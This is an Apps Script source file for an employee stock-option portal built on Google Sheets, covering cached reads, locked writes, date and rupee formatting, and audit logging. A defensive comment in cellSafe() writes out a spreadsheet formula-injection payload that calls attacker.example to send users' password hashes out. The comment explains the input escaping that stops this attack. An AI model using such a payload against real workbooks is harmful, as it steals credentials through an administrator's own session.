/**
 * Repo.gs — header-driven access to the workbook.
 *
 * Every table is read once per request and cached in memory, so a screen that
 * touches five tables costs five getValues() calls rather than fifty. Writes
 * go through LockService because two employees can submit in the same second.
 */


const Repo = (function () {


  const _cache = {};


  /**
   * Per-request tally of what we actually asked the Sheet for.
   *
   * Sheet round trips are the dominant cost of any slow screen, and guessing
   * which ones a request makes is how you end up optimising the wrong thing.
   * `rpc()` reports this back with every response.
   */
  const _stats = { reads: 0, writes: 0, cells: 0, readMs: 0, writeMs: 0, tabs: {} };


  function stats() { return _stats; }


  function timedRead(tab, cells, fn) {
    const t0 = new Date().getTime();
    try {
      return fn();
    } finally {
      _stats.reads++;
      _stats.cells += cells || 0;
      _stats.readMs += new Date().getTime() - t0;
      _stats.tabs[tab] = (_stats.tabs[tab] || 0) + 1;
    }
  }


  function timedWrite(fn) {
    const t0 = new Date().getTime();
    try {
      return fn();
    } finally {
      _stats.writes++;
      _stats.writeMs += new Date().getTime() - t0;
    }
  }


  /**
   * Make one value safe to put in a cell.
   *
   * Range.setValue() treats a string beginning with "=" as a FORMULA. Every
   * free-text field in this portal — a name, an address, an account holder,
   * a UTR — is typed by a participant and written straight into the
   * workbook. So a participant could enter
   *
   *     =IMPORTDATA("https://attacker.example/?d="&TEXTJOIN(",",1,Users!A:Z))
   *
   * and the next time an ESOP administrator opened the workbook it would
   * evaluate under THEIR Google account and post the Users tab — password
   * hashes, salts, every login — to an external server. The participant never
   * needs to see the sheet; the admin's own session does the exfiltration.
   *
   * A leading apostrophe is Sheets' own marker for "this is text, not a
   * formula". It is not stored in the value: getValue() returns the string
   * without it, so the data reads back exactly as typed. selfTest() round-
   * trips a value beginning with "=" to prove that, rather than trusting it.
   *
   * "+", "-" and "@" are included because they lead a formula in Excel, and
   * these tabs get exported and opened there.
   */
  function cellSafe(v) {
    if (typeof v !== 'string' || !v) return v;
    return /^[=+\-@\t\r]/.test(v) ? "'" + v : v;
  }


  /** Apply cellSafe across an object of column -> value. */
  function safeObject(obj) {
    const out = {};
    Object.keys(obj).forEach(function (k) { out[k] = cellSafe(obj[k]); });
    return out;
  }


  function book() {
    return SpreadsheetApp.getActiveSpreadsheet();
  }


  function sheet(name) {
    const sh = book().getSheetByName(name);
    if (!sh) throw new Error('Missing sheet tab "' + name + '". Run Setup > createWorkbook().');
    return sh;
  }


  /** Raw values including the header row. */
  function values(name) {
    if (_cache[name]) return _cache[name];
    const sh = sheet(name);
    const last = sh.getLastRow();
    const cols = Math.max(sh.getLastColumn(), 1);
    const vals = last === 0 ? [[]] : timedRead(name, last * cols,
      () => sh.getRange(1, 1, last, cols).getValues());
    _cache[name] = vals;
    return vals;
  }


  function invalidate(name) {
    if (name) delete _cache[name];
    else Object.keys(_cache).forEach(k => delete _cache[k]);
  }


  function headers(name) {
    const v = values(name);
    return (v[0] || []).map(h => String(h).trim());
  }


  /** Map of header -> zero-based column index. */
  function headerIndex(name) {
    const idx = {};
    headers(name).forEach((h, i) => { if (h) idx[h] = i; });
    return idx;
  }


  /**
   * All data rows as plain objects, each carrying a non-enumerable _row
   * (1-based sheet row number) so callers can write back precisely.
   */
  function objects(name) {
    const v = values(name);
    const hs = headers(name);
    const out = [];
    for (let r = 1; r < v.length; r++) {
      const row = v[r];
      if (row.every(c => c === '' || c === null)) continue;
      const o = {};
      for (let c = 0; c < hs.length; c++) {
        if (hs[c]) o[hs[c]] = row[c];
      }
      Object.defineProperty(o, '_row', { value: r + 1, enumerable: false });
      out.push(o);
    }
    return out;
  }


  function find(name, predicate) {
    const all = objects(name);
    for (let i = 0; i < all.length; i++) {
      if (predicate(all[i])) return all[i];
    }
    return null;
  }


  function filter(name, predicate) {
    return objects(name).filter(predicate);
  }


  /**
   * Rows whose `header` column equals `value`, without pulling the whole
   * table: one narrow column read to find the row numbers, then only those
   * rows. Grants runs to a few thousand rows by 22 columns, and a participant
   * holds at most a handful of them, so this turns a 75,000-cell read into
   * about 3,400 cells plus a few short rows.
   *
   * Falls back to a full scan if the table is already cached, since then the
   * data is in memory anyway.
   */
  function findByColumn(name, header, value) {
    const want = String(value === null || value === undefined ? '' : value).trim().toUpperCase();
    if (!want) return [];


    if (_cache[name]) {
      return objects(name).filter(o => String(o[header] || '').trim().toUpperCase() === want);
    }


    const sh = sheet(name);
    const lastRow = sh.getLastRow();
    if (lastRow < 2) return [];


    const hs = sh.getRange(1, 1, 1, Math.max(sh.getLastColumn(), 1)).getValues()[0]
      .map(h => String(h).trim());
    const col = hs.indexOf(header);
    if (col < 0) throw new Error('Sheet "' + name + '" has no column "' + header + '".');


    const keys = timedRead(name, lastRow - 1,
      () => sh.getRange(2, col + 1, lastRow - 1, 1).getValues());
    const wanted = [];
    for (let i = 0; i < keys.length; i++) {
      if (String(keys[i][0] || '').trim().toUpperCase() === want) wanted.push(i + 2);
    }
    if (!wanted.length) return [];


    const out = [];
    wanted.forEach(function (rowNumber) {
      const row = timedRead(name, hs.length,
        () => sh.getRange(rowNumber, 1, 1, hs.length).getValues())[0];
      const o = {};
      for (let c = 0; c < hs.length; c++) if (hs[c]) o[hs[c]] = row[c];
      Object.defineProperty(o, '_row', { value: rowNumber, enumerable: false });
      out.push(o);
    });
    return out;
  }


  /**
   * The first row whose `header` column equals `value`, read narrowly.
   *
   * The employee record is looked up on practically every request. Going
   * through objects() meant a 2,151-row by 25-column read — some 54,000 cells
   * — to find one row. This reads one column and then that row.
   */
  function findOne(name, header, value) {
    const hits = findByColumn(name, header, value);
    return hits.length ? hits[0] : null;
  }


  /** Append one object; unknown keys are ignored, missing keys left blank. */
  function append(name, obj) {
    return withLock(function () {
      const hs = headers(name);
      const row = hs.map(h => (obj[h] === undefined ? '' : cellSafe(obj[h])));
      timedWrite(() => sheet(name).appendRow(row));
      invalidate(name);
      return obj;
    });
  }


  /** Append many objects in one write. */
  function appendAll(name, objs) {
    if (!objs.length) return 0;
    return withLock(function () {
      const hs = headers(name);
      const rows = objs.map(o => hs.map(h => (o[h] === undefined ? '' : cellSafe(o[h]))));
      const sh = sheet(name);
      timedWrite(() => sh.getRange(sh.getLastRow() + 1, 1, rows.length, hs.length).setValues(rows));
      invalidate(name);
      return rows.length;
    });
  }


  /**
   * Patch specific fields of an existing row (1-based sheet row).
   *
   * Written as one setValues() per run of adjacent columns rather than one
   * setValue() per field. Saving the demat section patches a dozen columns
   * that sit next to each other in the schema, which was a dozen separate
   * Sheets calls at ~50-150 ms each; as runs it is one or two.
   *
   * Only changed columns are ever written. Writing a whole span would be
   * fewer calls still, but it would also rewrite the cells in between — and
   * on any tab where one of those holds a formula, writing back the value we
   * just read would quietly destroy it.
   */
  function update(name, rowNumber, patch) {
    return withLock(function () {
      const idx = headerIndex(name);
      const cols = Object.keys(patch)
        .filter(k => idx[k] !== undefined)
        .map(k => ({ col: idx[k] + 1, value: cellSafe(patch[k]) }))
        .sort((a, b) => a.col - b.col);
      if (!cols.length) return true;


      const sh = sheet(name);
      let run = [cols[0]];
      const flush = function () {
        if (run.length === 1) {
          timedWrite(() => sh.getRange(rowNumber, run[0].col).setValue(run[0].value));
        } else {
          timedWrite(() => sh.getRange(rowNumber, run[0].col, 1, run.length)
            .setValues([run.map(c => c.value)]));
        }
      };
      for (let i = 1; i < cols.length; i++) {
        if (cols[i].col === run[run.length - 1].col + 1) {
          run.push(cols[i]);
        } else {
          flush();
          run = [cols[i]];
        }
      }
      flush();


      invalidate(name);
      return true;
    });
  }


  /** Replace every data row of a table. Used by the grant sync. */
  function replaceAll(name, objs) {
    return withLock(function () {
      const sh = sheet(name);
      const hs = headers(name);
      const last = sh.getLastRow();
      if (last > 1) sh.getRange(2, 1, last - 1, Math.max(sh.getLastColumn(), hs.length)).clearContent();
      if (objs.length) {
        const rows = objs.map(o => hs.map(h => (o[h] === undefined ? '' : cellSafe(o[h]))));
        sh.getRange(2, 1, rows.length, hs.length).setValues(rows);
      }
      invalidate(name);
      return objs.length;
    });
  }


  function deleteRow(name, rowNumber) {
    return withLock(function () {
      timedWrite(() => sheet(name).deleteRow(rowNumber));
      invalidate(name);
      return true;
    });
  }


  /**
   * Serialise writes across concurrent executions. Reentrant within one
   * execution, so a helper that writes can safely be called from inside
   * another write without deadlocking on itself.
   */
  let _lockDepth = 0;
  let _lock = null;


  function withLock(fn) {
    if (_lockDepth > 0) {
      _lockDepth++;
      try { return fn(); } finally { _lockDepth--; }
    }
    _lock = LockService.getScriptLock();
    if (!_lock.tryLock(20000)) {
      throw new Error('The portal is busy saving another request. Please try again in a moment.');
    }
    _lockDepth = 1;
    try {
      return fn();
    } finally {
      _lockDepth = 0;
      _lock.releaseLock();
      _lock = null;
    }
  }


  return {
    book: book,
    sheet: sheet,
    headers: headers,
    headerIndex: headerIndex,
    objects: objects,
    find: find,
    filter: filter,
    findByColumn: findByColumn,
    findOne: findOne,
    stats: stats,
    cellSafe: cellSafe,
    append: append,
    appendAll: appendAll,
    update: update,
    replaceAll: replaceAll,
    deleteRow: deleteRow,
    invalidate: invalidate,
    withLock: withLock
  };
})();




/* ------------------------------------------------------------------ *
 * Small shared utilities
 * ------------------------------------------------------------------ */


const Util = {


  tz: function () {
    return Session.getScriptTimeZone() || 'Asia/Kolkata';
  },


  now: function () {
    return new Date();
  },


  /** ISO-ish stamp used in every audit and timestamp column. */
  stamp: function (d) {
    return Utilities.formatDate(d || new Date(), Util.tz(), 'yyyy-MM-dd HH:mm:ss');
  },


  /**
   * Canonical form of a WindowID ("2026-09").
   *
   * Sheets parses "2026-09" as a date on write, so a cell that was written as
   * a string comes back as a Date. Every comparison of a WindowID has to go
   * through here, or the lookup silently stops matching and a second window
   * row gets created for the same month.
   */
  windowKey: function (v) {
    if (v === null || v === undefined || v === '') return '';
    if (v instanceof Date) return Utilities.formatDate(v, Util.tz(), 'yyyy-MM');
    const s = String(v).trim();
    const m = s.match(/^(\d{4})-(\d{1,2})/);
    if (m) return m[1] + '-' + String(Number(m[2])).padStart(2, '0');
    const d = Util.toDate(s);
    return d ? Utilities.formatDate(d, Util.tz(), 'yyyy-MM') : s;
  },


  /** yyyy-MM-dd, the canonical date key across the workbook. */
  dateKey: function (d) {
    if (!d) return '';
    const dt = Util.toDate(d);
    if (!dt) return '';
    return Utilities.formatDate(dt, Util.tz(), 'yyyy-MM-dd');
  },


  /** Human date for emails and documents: 08 Sep 2026. */
  prettyDate: function (d) {
    const dt = Util.toDate(d);
    if (!dt) return '';
    return Utilities.formatDate(dt, Util.tz(), 'dd MMM yyyy');
  },


  /**
   * Human date AND time: 08 Sep 2026 at 20:44 IST.
   *
   * Timestamps are written as strings but Sheets parses them back into Date
   * objects, so anything that just stringifies the cell gets JavaScript's
   * raw form — "Tue Sep 08 2026 20:44:02 GMT+0530 (India Standard Time)".
   * That appeared on the signature block of the exercise notice, which is
   * the last place a debug-looking timestamp belongs. Always format
   * explicitly; never trust what came out of the cell.
   */
  /**
   * A timestamp column as a sortable number.
   *
   * Timestamps are WRITTEN as "yyyy-MM-dd HH:mm:ss", which sorts correctly as
   * text — but Sheets parses that into a datetime, so it comes back as a Date
   * and `String(date)` is "Tue Sep 08 2026 …". Sorting those as text orders
   * them by the name of the weekday: "Mon Sep 21" lands before "Tue Sep 08".
   *
   * That is not theoretical. It put a participant's newest application last
   * in the list, so after a second exercise the portal showed them the older
   * approved one. Sort timestamps through here, never as strings.
   */
  timeMs: function (v) {
    const dt = Util.toDate(v);
    return dt ? dt.getTime() : 0;
  },


  /**
   * A window's label ("September 2026"), however the cell came back.
   *
   * Sheets parses "September 2026" as a date, so the Label column is written
   * as text and read back as 01-Sep-2026 — which printed on screen as
   * "Tue Sep 01 2026 00:00:00 GMT+0530 (India Standard Time) exercise
   * window". Same trap as WindowID and every timestamp: never trim a cell and
   * hope.
   */
  monthLabel: function (v) {
    if (v === null || v === undefined || v === '') return '';
    if (v instanceof Date) return Utilities.formatDate(v, Util.tz(), 'MMMM yyyy');
    return String(v).trim();
  },


  prettyStamp: function (d) {
    const dt = Util.toDate(d);
    if (!dt) return '';
    return Utilities.formatDate(dt, Util.tz(), 'dd MMM yyyy') + ' at ' +
      Utilities.formatDate(dt, Util.tz(), 'HH:mm') + ' IST';
  },


  /**
   * Accepts Date, yyyy-MM-dd, dd/MM/yyyy, "Sep 08, 2026" or a spreadsheet
   * serial. The vesting report writes 0 or "-" where there is no date, so
   * those are treated as absent rather than as 1899.
   */
  toDate: function (v) {
    if (v === null || v === undefined || v === '' || v === '-') return null;
    if (v instanceof Date) return isNaN(v.getTime()) ? null : v;
    if (typeof v === 'number') {
      if (v <= 0) return null;
      const d = new Date((v - 25569) * 86400000);   // Sheets serial, days since 1899-12-30
      return isNaN(d.getTime()) ? null : d;
    }
    const s = String(v).trim();
    if (!s || s === '-' || s === '0') return null;
    let m = s.match(/^(\d{4})-(\d{1,2})-(\d{1,2})/);
    if (m) return new Date(Number(m[1]), Number(m[2]) - 1, Number(m[3]));
    m = s.match(/^(\d{1,2})[\/\-](\d{1,2})[\/\-](\d{4})$/);
    if (m) return new Date(Number(m[3]), Number(m[2]) - 1, Number(m[1]));
    // "Sep 08, 2026" / "08-Sep-2026"
    const MONTHS = ['jan', 'feb', 'mar', 'apr', 'may', 'jun', 'jul', 'aug', 'sep', 'oct', 'nov', 'dec'];
    m = s.match(/^([A-Za-z]{3,})\s+(\d{1,2}),?\s*(\d{4})$/);
    if (m) {
      const mi = MONTHS.indexOf(m[1].slice(0, 3).toLowerCase());
      if (mi >= 0) return new Date(Number(m[3]), mi, Number(m[2]));
    }
    m = s.match(/^(\d{1,2})[-\s]([A-Za-z]{3,})[-\s](\d{4})$/);
    if (m) {
      const mi = MONTHS.indexOf(m[2].slice(0, 3).toLowerCase());
      if (mi >= 0) return new Date(Number(m[3]), mi, Number(m[1]));
    }
    const d = new Date(s);
    return isNaN(d.getTime()) ? null : d;
  },


  /** Midnight of the given date, in script timezone terms. */
  startOfDay: function (d) {
    const dt = Util.toDate(d) || new Date();
    return new Date(dt.getFullYear(), dt.getMonth(), dt.getDate());
  },


  addDays: function (d, n) {
    const dt = Util.startOfDay(d);
    dt.setDate(dt.getDate() + n);
    return dt;
  },


  lastDayOfMonth: function (year, monthIndex) {
    return new Date(year, monthIndex + 1, 0).getDate();
  },


  /**
   * A number from a cell, tolerating how people actually type money.
   *
   * A figure keyed by hand often arrives as text — "₹ 79.99", "1,25,000",
   * "Rs 500", "(250)" for a negative, or with a stray space. Number() gives
   * NaN for every one of those, which would silently become 0 and quietly
   * mis-price an exercise. So strip the decoration first and only then convert.
   */
  num: function (v, dflt) {
    const fallback = dflt === undefined ? 0 : dflt;
    if (v === '' || v === null || v === undefined || v === '-') return fallback;
    if (typeof v === 'number') return isNaN(v) ? fallback : v;
    if (typeof v === 'boolean') return v ? 1 : 0;
    if (v instanceof Date) return v.getTime();


    let s = String(v).trim();
    if (!s) return fallback;


    // Accounting parentheses mean negative.
    let sign = 1;
    if (/^\(.*\)$/.test(s)) { sign = -1; s = s.slice(1, -1); }


    s = s
      .replace(/[₹$£€]/g, '')   // ₹ $ £ €
      .replace(/\brs\.?\b/gi, '')
      .replace(/\binr\b/gi, '')
      .replace(/[,\s ]/g, '')                  // commas, spaces, nbsp
      .replace(/%$/, '');


    if (s === '' || s === '-' || s === '.') return fallback;
    const n = Number(s);
    return isNaN(n) ? fallback : sign * n;
  },


  /** Indian grouping, no decimals. */
  inr: function (n) {
    const v = Math.round(Util.num(n));
    const s = String(Math.abs(v));
    let out;
    if (s.length <= 3) {
      out = s;
    } else {
      const head = s.slice(0, s.length - 3);
      const tail = s.slice(-3);
      out = head.replace(/\B(?=(\d{2})+(?!\d))/g, ',') + ',' + tail;
    }
    return (v < 0 ? '-₹' : '₹') + out;
  },


  /**
   * An amount in words on the Indian scale — crore, lakh, thousand, hundred.
   *
   * Used on the exercise notice and in the emails that ask someone to pay.
   * The words are the check that the digits were read correctly: a
   * transposed lakh hides easily in "₹2,30,926" and not at all in
   * "Two Lakh Thirty Thousand Nine Hundred Twenty Six".
   */
  inWords: function (amount) {
    const ONES = ['', 'One', 'Two', 'Three', 'Four', 'Five', 'Six', 'Seven', 'Eight', 'Nine',
      'Ten', 'Eleven', 'Twelve', 'Thirteen', 'Fourteen', 'Fifteen', 'Sixteen',
      'Seventeen', 'Eighteen', 'Nineteen'];
    const TENS = ['', '', 'Twenty', 'Thirty', 'Forty', 'Fifty', 'Sixty', 'Seventy', 'Eighty', 'Ninety'];
    const two = function (n) {
      if (n < 20) return ONES[n];
      return TENS[Math.floor(n / 10)] + (n % 10 ? ' ' + ONES[n % 10] : '');
    };


    const raw = Util.num(amount, 0);
    const v = Math.abs(Math.round(raw * 100) / 100);
    let whole = Math.floor(v);
    const paise = Math.round((v - whole) * 100);


    const say = function (n) {
      if (n === 0) return 'Zero';
      const parts = [];
      const crore = Math.floor(n / 10000000); n %= 10000000;
      const lakh = Math.floor(n / 100000); n %= 100000;
      const thousand = Math.floor(n / 1000); n %= 1000;
      const hundred = Math.floor(n / 100); n %= 100;
      if (crore) parts.push(two(crore) + ' Crore');
      if (lakh) parts.push(two(lakh) + ' Lakh');
      if (thousand) parts.push(two(thousand) + ' Thousand');
      if (hundred) parts.push(ONES[hundred] + ' Hundred');
      if (n) parts.push(two(n));
      return parts.join(' ');
    };


    let out = 'Rupees ' + say(whole);
    if (paise) out += ' and ' + two(paise) + ' Paise';
    return (raw < 0 ? 'Minus ' : '') + out + ' only';
  },


  inr2: function (n) {
    const v = Util.num(n);
    const whole = Math.floor(Math.abs(v));
    const paise = Math.round((Math.abs(v) - whole) * 100);
    return Util.inr(v < 0 ? -whole : whole).replace(/^-?₹/, v < 0 ? '-₹' : '₹') +
      '.' + String(paise).padStart(2, '0');
  },


  count: function (n) {
    const v = Math.round(Util.num(n));
    const s = String(Math.abs(v));
    if (s.length <= 3) return (v < 0 ? '-' : '') + s;
    const head = s.slice(0, s.length - 3);
    const tail = s.slice(-3);
    return (v < 0 ? '-' : '') + head.replace(/\B(?=(\d{2})+(?!\d))/g, ',') + ',' + tail;
  },


  uid: function (prefix) {
    return (prefix || '') + Utilities.getUuid().replace(/-/g, '').slice(0, 12).toUpperCase();
  },


  randomCode: function (digits) {
    const n = digits || 6;
    let s = '';
    for (let i = 0; i < n; i++) s += Math.floor(Math.random() * 10);
    return s;
  },


  /** Case- and space-insensitive key for header matching during import. */
  slug: function (s) {
    return String(s === null || s === undefined ? '' : s)
      .toLowerCase().replace(/[^a-z0-9]/g, '');
  },


  trim: function (v) {
    return String(v === null || v === undefined ? '' : v).trim();
  },


  escapeHtml: function (s) {
    return Util.trim(s)
      .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
  }
};




/** Append an audit row. Never throws — auditing must not break a request. */
function audit(actor, role, action, appId, details) {
  try {
    Repo.append(T.AUDIT, {
      Timestamp: Util.stamp(),
      Actor: actor || '',
      Role: role || '',
      Action: action || '',
      AppID: appId || '',
      Details: typeof details === 'string' ? details : JSON.stringify(details || {})
    });
  } catch (e) {
    console.error('audit failed: ' + e);
  }
}


